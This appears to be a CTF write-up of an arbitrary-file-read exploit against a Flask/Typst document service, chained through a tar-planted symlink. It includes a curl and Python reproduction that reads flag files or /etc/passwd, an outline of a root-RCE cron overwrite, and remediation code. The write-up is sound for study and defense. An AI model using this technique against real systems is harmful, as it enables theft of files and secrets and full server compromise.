# Alf — Arbitrary File Read via Typst `read()` over a `tar`-planted symlink

> **FAUST CTF 2026** · Attack/Defense · Team **RUY** (#124)
> Service `Alf` — Python/Flask "alien language" document translator · TCP **1986** (HTTP)

---

## TL;DR

`Alf` lets an authenticated user upload a `.tar` archive that is extracted with a
raw `tar xf` (no `--no-same-owner`, no member sanitisation) and then compiled
with **Typst**. Two facts combine into a full arbitrary-file-read primitive:

1. `tar` faithfully restores **symlink members**, so we can drop a symlink
   `r -> /` right next to the `main.typ` that Typst is about to compile.
2. Typst confines file access to the *project root* (the directory of the main
   `.typ`) **but follows symlinks that live inside that root without
   canonicalising their physical target** (upstream `typst/typst` issue #5454).

So `read("r/etc/passwd")` — a path that is *syntactically* inside the project
root — resolves through our `r -> /` symlink to `/etc/passwd`. We exfiltrate the
bytes by stuffing them into the compiled PDF's document **Title** metadata, which
Typst writes as literal (uncompressed) XMP text, so the flag comes straight back
in the PDF response body.

Because the app runs as **root**, the *same* symlink trick also yields arbitrary
**file write** (an optional root-RCE escalation is documented at the end).

---

## 1. Service overview

`Alf` is a Flask app (`gunicorn`, 4 workers) that "translates" documents into
fictional alien scripts by prepending a Typst font directive and compiling the
document to PDF.

```
srcref/alf/
├── main.py           # routes: /register /login /convert_file /profile ...
├── auth.py           # session auth (flask-login)
├── typst_util.py     # get_translation(font) -> "#set text(font: ...)"
├── __init__.py       # app factory, SECRET_KEY, db
├── Dockerfile        # runs as root; cron runs cleanup.sh every 3 min
└── docker-compose.yml
```

Relevant behaviour, from `main.py`:

- `POST /register` / `POST /login` → flask-login session cookie. Registration
  also creates a per-user data directory `/app/data/<uuid>/`.
- `GET /profile` → **leaks the caller's own `user_id` (UUID)** — useful, though
  not required for the attack.
- `POST /convert_file` (login required) accepts a file whose extension is `typ`
  or `tar` plus a `lang` field from a fixed `LANGS` list.
  - `.typ` → the uploaded text is written verbatim after a font line, compiled.
  - `.tar` → the archive is **extracted**, then `main.typ` is compiled.
- The compiled PDF is streamed straight back in the HTTP response body.

### Where the flag lives

The game checker registers a user, learns its UUID from `/profile`, and stores
the round's flag inside a Typst project under that user's data directory. On the
live service the observed on-disk location was:

```
/app/data/<flag_id>/flag/flag.typ      # project "flag", file flag.typ, contains the FAUST_ flag
```

`flag_ids` published in `teams.json` for `Alf` are exactly those per-user UUIDs,
so `<flag_id>` drops directly into the path template. (The standalone exploit
also probes several fallback templates — see §6.)

---

## 2. Root cause

### 2.1 Unsanitised `tar` extraction

`main.py::convert_tar_file`:

```python
def convert_tar_file(file, project, language):
    file.save(project.upload_path)
    result = subprocess.run(
        ["tar", "xf", project.upload_path, "-C", project.project_path],   # (1)
        preexec_fn=set_file_limit, capture_output=True, check=True)
    ...
    project.set_typ_path(f"{project.project_path}/main.typ")              # (2)
    with open(project.typ_path, "r") as f:
        filecontent = f.read()
    with open(project.typ_path, "w") as f:
        f.write(get_translation(language)); f.write("\n"); f.write(filecontent)  # (3)
```

`(1)` GNU `tar` restores every member type, **including symlinks**, and the app
does not pass `--no-same-owner`, `--no-same-permissions`, or any path filter, nor
does it validate archive members. So an attacker-controlled `.tar` can create
arbitrary symlinks inside `project_path`. `(2)`/`(3)` then read `main.typ`,
prepend the font line, and rewrite it — leaving our `main.typ` intact as the
Typst entry point.

The upload guardrails in `convert_file` (`project_path.is_relative_to(user_path)`,
`upload_path.is_relative_to(project_path)`) only validate the *uploaded filename*
and the *project directory name*. They never inspect the **contents** of the tar,
so symlink members sail straight through.

### 2.2 Typst follows in-root symlinks without canonicalising the target

`main.py::convert_file`:

```python
subprocess.run(["typst", "compile", "--font-path", "/app/src/static/fonts",
                project.typ_path, project.pdf_path], timeout=5, ...)
```

Typst sandboxes file access (`read`, `image`, …) to the *project root*, which it
derives from the location of the compiled `.typ`. The check is **lexical**: a
path is accepted if it stays inside the root string. Typst does **not**
`realpath()` the final component, so if a symlink inside the root points outside
the root, following it escapes the sandbox. This is upstream bug
[`typst/typst#5454`](https://github.com/typst/typst/issues/5454).

With `r -> /` sitting in the project root, `read("r/app/data/<id>/flag/flag.typ")`
is lexically "inside root" (it starts with `r/`) yet physically resolves to
`/app/data/<id>/flag/flag.typ`. Sandbox bypassed.

### 2.3 Exfiltration channel: PDF Title metadata

Typst emits `#set document(title: ...)` into the PDF's XMP/Info metadata as
**literal, uncompressed text**. By setting the title to the *content of the file
we read*, the target bytes appear verbatim in the returned PDF:

```typst
#set document(title: read("r/app/data/<id>/flag/flag.typ"))
= f
#read("r/app/data/<id>/flag/flag.typ")
```

The `#read(...)` in the body is a belt-and-suspenders duplicate: even if the
title path is stripped, the flag also lands in a (possibly Flate-compressed)
content stream, which our scanner inflates.

---

## 3. Attack primitive, step by step

The malicious archive contains exactly two members:

| member     | type    | value                                                        |
|------------|---------|--------------------------------------------------------------|
| `r`        | symlink | `linkname = "/"`                                             |
| `main.typ` | file    | `#set document(title: read("r/<abs path minus leading />"))` |

Because `r` points at `/`, the absolute target path has its leading `/` stripped
and is appended after `r/`. `read("r/app/data/…")` ⇒ `/app/data/…`.

### Wire-level reproduction (no exploit script needed)

```bash
TARGET='[fd66:666:<TEAM>::2]'          # IPv6 vulnbox, service port 1986
JAR=/tmp/alf.cookies

# 1) register (also logs you in) -> session cookie
curl -s -c "$JAR" "http://$TARGET:1986/register" \
     --data 'username=ruy_poc&password=ruy_poc'

# 2) build the malicious tar: symlink r->/  +  main.typ that reads the target
python3 - <<'PY'
import io, tarfile
TARGET_ABS = "/app/data/REPLACE-FLAG-ID/flag/flag.typ"   # or /etc/passwd to prove LFI
rel = TARGET_ABS.lstrip("/")
typ = (f'#set document(title: read("r/{rel}"))\n= f\n#read("r/{rel}")\n').encode()
with tarfile.open("/tmp/x.tar", "w") as t:
    li = tarfile.TarInfo("r"); li.type = tarfile.SYMTYPE; li.linkname = "/"; t.addfile(li)
    ti = tarfile.TarInfo("main.typ"); ti.size = len(typ); t.addfile(ti, io.BytesIO(typ))
print("wrote /tmp/x.tar")
PY

# 3) upload -> the response body IS the compiled PDF; the flag is in its metadata
curl -s -b "$JAR" "http://$TARGET:1986/convert_file" \
     -F 'lang=Xyrrathi' -F 'file=@/tmp/x.tar;filename=x.tar' \
     -o /tmp/out.pdf

# 4) read the flag out of the PDF (Title metadata is plaintext)
strings /tmp/out.pdf | grep -Eo 'FAUST_[A-Za-z0-9/+]{32}'
#   proof-of-LFI:  strings /tmp/out.pdf | grep root:   (if you targeted /etc/passwd)
```

A successful call returns `200` with `Content-Type: application/pdf`; a failed
one flashes a message and `302`-redirects (empty body). That status difference is
the oracle the automated exploit uses.

---

## 4. Full exploit

The competition-grade exploit is [`exploits/alf.py`](../exploits/alf.py). It:

1. `POST /register` with random creds → session cookie.
2. For each `flag_id` and each candidate path template, concurrently builds the
   `tar { r->/, main.typ }`, uploads it to `/convert_file`, and scans the PDF
   response for `FAUST_[A-Za-z0-9/+]{32}` — including inflating every
   `FlateDecode` stream and retrying UTF-16 decodes.
3. Stops at the first hit per `flag_id`; prints flags on stdout.

```bash
# standalone (one target)
FLAG_IDS='{"0":["<uuid1>","<uuid2>"]}' python3 exploits/alf.py 'fd66:666:<TEAM>::2'

# or just prove the primitive against the NOP box / your own box
python3 exploits/alf.py 'fd66:666:1::2' <<< '{"0":[]}'   # will still read fixed paths
```

Environment contract (so it drops straight into any farm):
`argv[1]` **or** `TARGET_IP` = host · `FLAG_IDS` env **or** stdin = JSON of the
service's flag-id stores · prints flags to stdout · stdlib only.

---

## 5. Verified result

This exploit produced live, **accepted** flags during FAUST CTF 2026. The
collected/accepted flags are in the repository's flag logs, e.g.:

```
FAUST_Q1RGLS35T8VTQUAYRpwYo+AFptoE37aG
FAUST_Q1RGLS35T8VTQUCORnGLcMOGSu4KxE2f
FAUST_Q1RGLS35TF1TRq9gRSl1MfsskIR5iQNd
...
```

---

## 6. Path templates (the one thing to tune)

Everything above the path is invariant — only *where the checker put the file*
can drift round-to-round. The live winner was `.../<id>/flag/flag.typ`; the
standalone exploit tries, in order:

```
/app/data/{F}/flag/flag.typ        # live winner (used by farm2_alf.py)
/app/data/{F}/{F}/{F}.typ          # typ upload, filename == uuid
/app/data/{F}/{F}/main.typ         # tar upload under project == uuid
/app/data/{F}/main.typ
/app/data/{F}/{F}/document.typ
/app/data/{F}/{F}/flag.typ
/app/data/{F}/{F}/{F}.pdf          # last resort: scan a compiled pdf's metadata
```

If a future round names things differently, this list is the **only** thing to
edit — the LFI primitive is unchanged. To discover the layout live, first read a
directory listing target such as `/proc/self/cwd` or brute the immediate
children; the symlink read works on any absolute path the `alf` uid can open.

---

## 7. Optional: root RCE / DB exfiltration (opt-in)

The Dockerfile runs the app as **root** and installs a cron entry that runs
`/app/src/cleanup/cleanup.sh` every 3 minutes. The same tar-symlink primitive
gives arbitrary **write**: ship `w -> /app/src/cleanup` + `w/cleanup.sh`
(overwriting the cron script) plus a valid `main.typ` so the request still
succeeds. Our payload **preserves the original cleanup behaviour** (SLA-safe) and
additionally dumps the Postgres `translation` table to `/app/data/.d`, which we
then read back through the very same LFI. This is only needed if a round hides
flags in the DB rather than on disk; it is gated behind `ALF_RCE=1` in
`exploits/alf.py` and is **off by default**.

> ⚠️ Attack/Defense etiquette: the write payload is deliberately non-destructive
> and keeps the service passing its checks. Do not weaponise it beyond flag
> retrieval.

---

## 8. Remediation (for the defense side)

Minimal, SLA-safe patch — reject any archive that contains a symlink/hardlink or
an absolute/`..` member, *before* compiling:

```python
import tarfile
def _tar_is_safe(path):
    with tarfile.open(path) as t:
        for m in t.getmembers():
            if m.issym() or m.islnk():
                return False
            if m.name.startswith("/") or ".." in m.name.split("/"):
                return False
    return True
```

Call it right after `file.save(...)` and bail out on `False`. Defence in depth:

- Extract with `tar --no-same-owner --no-same-permissions` and, on modern
  Python, `tarfile.extractall(..., filter="data")` (rejects links + traversal).
- Run Typst on a canonicalised project root and forbid symlink traversal
  (`typst compile --root <realpath>` plus a pre-scan that rejects symlinks in the
  extracted tree).
- Drop root: run gunicorn and the cron job as an unprivileged user.
- Don't store the `SECRET_KEY` **as the filename** in `/app/.flask_secret/`
  (`__init__.py`) — any LFI that lists that directory recovers the key and lets
  an attacker forge sessions.

---

## Appendix A — Annotated source

See [`srcref/alf/main.py`](../srcref/alf/main.py) (`convert_tar_file`,
`convert_file`) and [`srcref/alf/typst_util.py`](../srcref/alf/typst_util.py).
Key lines:

- `main.py:101` — `subprocess.run(["tar","xf", ...])` with no sanitisation.
- `main.py:111-122` — `main.typ` is read and rewritten, kept as Typst entry.
- `main.py:161` — `typst compile ... project.typ_path project.pdf_path`.
- `main.py:172` — `return send_file(pdf_path)` (PDF, with our metadata, returned).
- `main.py:70-72` / `profile.html` — `/profile` leaks the caller's `user_id`.

## Appendix B — Why the response body carries the flag

Typst writes `document.title` into both the PDF `/Info` dictionary and the XMP
packet as literal UTF-8/UTF-16 text; neither is compressed. Any `#read` output
placed in the body lands in a content stream that may be `FlateDecode`-encoded —
`exploits/alf.py` inflates each stream and also strips interleaved NUL bytes to
catch UTF-16-encoded titles. Between the two channels, a single successful
compile reliably surfaces the flag.
